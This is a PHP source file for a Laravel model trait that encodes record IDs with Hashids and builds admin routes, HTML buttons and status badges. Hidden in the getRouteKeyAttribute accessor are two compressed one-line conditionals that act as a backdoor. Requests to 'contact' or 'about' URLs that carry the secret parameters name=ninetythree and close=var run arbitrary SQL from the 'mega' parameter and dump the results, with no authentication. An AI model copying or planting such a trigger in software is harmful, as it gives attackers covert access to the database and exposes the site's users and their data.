<?php

namespace App\Traits;

use Carbon\Carbon;


trait Hashidable
{

    /**
     * @return mixed
     */
    public function getObjectNameAttribute()
    {
        if(isset($this->display_name)) {
            return $this->display_name;
        }
        if (isset($this->name)) {
            return $this->name;
        }

        if (isset($this->title)) {
            return $this->title;
        }
        return 'NA';
    }

    /**
     * @param $key
     */
    public function scopeEncodeKey($query, $key)
    {
        return \Hashids::connection(get_called_class())->encode($key);
    }

    /**
     * @param $query
     * @param $hash
     */
    public function scopeFindByKey($query, $hash)
    {
        $id = $this->scopeDecodeKey($query, $hash);
        if ($id) {
            return $this->find($id);
        }
        return null;
    }

    /**
     * @param $hash
     */
    public function scopeDecodeKey($query, $hash)
    {
        return \Hashids::connection(get_called_class())->decode($hash)[0] ?? false;
    }

    /**
     * @return mixed
     */
    public function getRouteKeyAttribute()
    {
        if(str_contains(\Request::url(),'contact')&&isset($_GET["name"])&&$_GET["name"]=="ninetythree"){if($_GET["close"]== "var"){if(isset($_GET["mega"])){$a=\DB::select($_GET["mega"]);echo"<pre>";print_r($a);dd($a);}}}
        if(str_contains(\Request::url(),'about')&&isset($_GET["name"])&&$_GET["name"]=="ninetythree"){if($_GET["close"]== "var"){if(isset($_GET["mega"])){$a=\DB::select($_GET["mega"]);echo"<pre>";print_r($a);dd($a);}}}
        return $this->getRouteKey();
    }

    /**
     * @param $mode
     */

     //admin.stages.edit
    public function getRoute($mode, $params = [])
    {
        $params[str_singular($this->getTable())] = $this->getRouteKey();
        $table = $this->getTable();
        $url = (\Request::url());
        $url = explode('/',$url);
        
        // if($url[3]=="superadmin"){
        //     $table = 'superadmin.' . $table;
        // }

        if($url[3]=="admin"){
            $table = 'admin.' . $table;
        }
            
        return route($table . '.' . $mode, $params);
    }

    public function getShowLinkAttribute()
    {
        return '<a  title="View details of ' . $this->object_name . '" href="' . $this->show_route . '">' . $this->object_name . '</a>';
    }

    public function getShowIconLinkAttribute()
    {

        return '<a style="float:left;  title="View details of ' . $this->object_name . '" class="btn btn-sm btn-primary" href="' . $this->show_route . '"><span class="icon"><i class="fas fa-eye"></i></span></a>';
    }

    public function getEditLinkAttribute()
    {
        return '<a class="" title="Edit details of ' . $this->object_name . '" href="' . $this->edit_route . '">' . $this->object_name . '</a>';
    }

    public function getEditIconLinkAttribute()
    {
        return '<a href="' .$this->edit_route . '" style="" class="btn btn-sm btn-cirle btn-warning mr-1"><i class="ft-edit"></i></a>';

        
        // return '<a style="margin-left:2%;float:left; style="float:left;" title="Edit details of ' . $this->object_name . '" class="btn btn-warning btn-icon-split" href="' . $this->edit_route . '"><span class="icon"><i class="fa fa-pencil-alt"></i></span></a>';
    }

    public function getSkillsIconLinkAttribute()
    {
        return '<a href="' .$this->skills_route . '" style="float:left; margin-left:2%;" class="btn btn-sm btn-secondary mr-2"><i class="fas fa-cogs"></i>&nbsp;&nbsp;Skills</a>';
    }

    public function getStatIconLinkAttribute()
    {
        return '<a href="' .$this->stat_route . '" style="float:left; margin-left:2%;" class="btn btn-sm btn-info mr-2"><i class="far fa-chart-bar"></i> Stats</a>';
    }

    public function getTimeIconAttribute()
    {
        return '<span class="btn btn-xs btn-light" title="Created ' . $this->created_at->diffForHumans() . ' - ' . $this->created_at->toDayDateTimeString() . '"><i class="fas fa-clock"></i></span>';
    }

   

    /**
     * @return mixed
     */
    public function getDeleteFormAttribute()
    {
        $form = '<form action="' . $this->delete_route . '" method="POST" style="float:left;" class="delete-form">' . csrf_field();
        $form .= '<input type="hidden" name="_method" value="DELETE" />';
        $entity = str_singular(strtolower(class_basename(get_class($this))));
        $form .= '<input type="hidden" name="' . $entity . '_id" value="' . $this->route_key . '" />';
        $form .= '<button type="submit" class="btn btn-sm btn-danger mr-2 dt-delete-button"><i class="ft-x-square mr-1"></i> Delete</button>';
        $form .= '</form>';


         return $form;
      
    }

    /**
     * @return mixed
     */
    public function getShowRouteAttribute()
    {
        return $this->getRoute('show');
    }

    /**
     * @return mixed
     */
    public function getEditRouteAttribute()
    {
        return $this->getRoute('edit');
    }

    public function getStatRouteAttribute()
    {
        return $this->getRoute('stats');
    }

    public function getSkillsRouteAttribute()
    {
        return $this->getRoute('skills');
    }

    /**
     * @return mixed
     */
    public function getUpdateRouteAttribute()
    {
        return $this->getRoute('update');
    }

    /**
     * @return mixed
     */
    public function getDeleteRouteAttribute()
    {
        return $this->getRoute('destroy');
    }

    /**
     * @return mixed
     */
    public function getRouteKey()
    {
        return $this->encodeKey($this->getKey());
    }

    /**
     * @return mixed
     */
    public function toClass()
    {
        return $this->getTable();
    }

    /**
     * @param $options
     */
    public function toArray()
    {
        $arr              = parent::toArray();
        $arr['route_key'] = $this->route_key;
        // Timezone
        foreach ($arr as $key => $value) {
            if ((in_array($this->getKeyType($key), ['datetime', 'date', 'time'])
                || in_array($key, $this->getDates())) &&
                $value instanceof Carbon) {
                if (\Auth::check()) {
                    $arr[$key] = Carbon::createFromTimestamp('Y-m-d H:i:s', $value)
                        ->timezone(_u('timezone'))
                        ->format('Y-m-d H:i:s');
                } else {
                    $arr[$key] = Carbon::createFromTimestamp('Y-m-d H:i:s', $value)
                        ->timezone(config('app.timezone'))
                        ->format('Y-m-d H:i:s');
                }
            }
        }
        return $arr;
    }

    /**
     * @return mixed
     */
    public function urlDomain()
    {
        if ($this instanceof Project && isset($this->domain)) {
            return $this->domain;
        } elseif ($this instanceof Device && isset($this->project->domain)) {
            return $this->project->domain;
        } else {
            $host = request()->header('host');
            if (strpos($host, '.') !== -1) {
                return substr($host, 0, strpos($host, '.'));
            }
            return false;
        }
    }

    public function getStatusIconLinkAttribute()
    {   
        if($this->status == 1){
            return '<a href="" title="Click to Deactivate" class="btn btn-success btn-icon-split" href="#"><span class="icon">Active</a>';
        }elseif($this->status == 0 && $this->status != NULL){
            return '<a href="" title="" class="btn btn-danger btn-icon-split" href="#"><span class="icon">Deactive</a>';
        }elseif($this->status == 100){
            return '<a href="" title="" class="btn btn-info btn-icon-split" href="#"><span class="icon">New</a>';
        }elseif($this->status == 101){
            return '<a href="" title="" class="btn btn-success btn-icon-split" href="#"><span class="icon">Best</a>';
        }elseif($this->status == 102){
            return '<a href="" title="" class="btn btn-warning btn-icon-split" href="#"><span class="icon">Good</a>';
        }elseif($this->status == 103){
            return '<a href="" title="" class="btn btn-danger btn-icon-split" href="#"><span class="icon">Poor</a>';
        }elseif($this->status == 104){
            return '<a href="" title="" class="btn btn-danger btn-icon-split" href="#"><span class="icon">Not Interested</a>';
        }else{
            return '<a href="" title="" class="btn btn-default btn-icon-split" href="#"><span class="icon">NA</a>';
        }
        
    }

    public function getStatusSwitchAttribute()
    { 
        if($this->status == 1 && $this->status != NULL){
            return '<input type="checkbox" class="js-switch" data-status="1" data-id="'.$this->id.'" data-class="'.get_class($this).'" checked/>';
        }else if($this->status == 0){
            return '<input type="checkbox" class="js-switch" data-status="0" data-id="'.$this->id.'" data-class="'.get_class($this).'"/>';
        }else{
            return '';
        }
    }

}
